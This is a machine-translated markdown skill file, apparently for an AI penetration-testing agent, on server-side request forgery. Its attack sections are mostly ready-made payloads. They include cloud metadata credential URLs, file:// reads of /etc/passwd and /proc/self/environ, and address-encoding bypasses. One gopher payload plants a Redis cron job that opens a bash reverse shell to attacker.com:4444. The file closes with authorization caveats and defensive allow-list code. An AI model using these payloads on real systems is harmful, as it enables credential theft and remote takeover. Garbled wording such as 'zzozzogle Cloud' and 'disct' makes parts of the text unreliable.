---
name: ssrf-testing
Discretion: SSRF server end requests professional skills and methodology for forgery testing
version: 1.0.0
---

# SSRFServer's requesting a fake test.

## Overview

This skill provides detection, use, and protection against SSRF vulnerabilities.

## Vulnerability Principle

The application accepts the URL parameters and requests the URL, which allows the attacker to control the target of the request, resulting in:
- Intranet resource access
- Read Local File
- Port Scanning
- Go around the firewall.
- Cloud Service metadata access

## Test Method

### 1. Identification of SSRF input points

**Common function:**
- URL preview/clip
- File Upload (Remote URL)
- WebhookTurn back.
- APIProxy
- Data Import
- Picture Processing
- PDFGenerate

### 2. Basic Detection

**Test local loops:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test Intranet IP:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test file protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass Techniques

**IP address code:**
```
127.0.0.1 → 2130706433 (Decimal)
127.0.0.1 → 0x7f000001 (Hexadecimal)
127.0.0.1 → 0177.0.0.1 (Oct)
```

**Domain name parsing around:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL reoriented:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation Techniques

### Intranet detection

**Port scan:**
```bash
# UsingBurp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Identified services:**
- Response time difference
- Error message
- HTTPStatus Code
- Response content

### Cloud Service metadata

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**zzozzogle Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Aryan:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Intranet attack.

**Access management admin panel:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Redis not authorized to visit:**
```
http://127.0.0.1:6379
# And send it.RedisCommand
```

**FastCGI attack:**
```
http://127.0.0.1:9000
# ExploitFastCGIProtocol execution orders
```

## Advanced utilization

### GopherAgreement

**Send any protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis executory:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### DictAgreement

**Port scanning and information gathering:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File protocol

**Read local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Using the Tools

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port Scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# GenerateGopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Blind SSRF:**
```
http://burpcollaborator.net
# See if there's any.DNS/HTTPRequest
```

## Verification and Reporting

### Verification Steps

1. Confirmable control of request target.
2. Validate on-line resource access or port scan
3. Assessment of the extent of impact (intranet penetration, data leakage, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Vulnerability location and input parameter
- Accessible Intranet resources or ports
- the complete exploitation steps andPoC
- Remediation recommendations (URL White List, de-hazard protocol, etc.)

## Preventive Measures

### Recommended Approach

1. **URLWhite list**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable hazard protocols**
   - Allow Onlyhttp/https
   - Prohibit file < >, gopher >, disct >

3. **IPIP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Authentication using DNS resolution**
   - Parsing domain name acquisitionIP
   - Verify whether IP is on the intranet range

5. **Network Isolation**
   - Limit server access
   - Use proxy server

## Important Notes

- Perform only in an authorized testing environment
- Avoid impact on the intranet system
- Attention to support for different agreements
- Be careful with the frequency of requests during testing and avoid triggering protection.
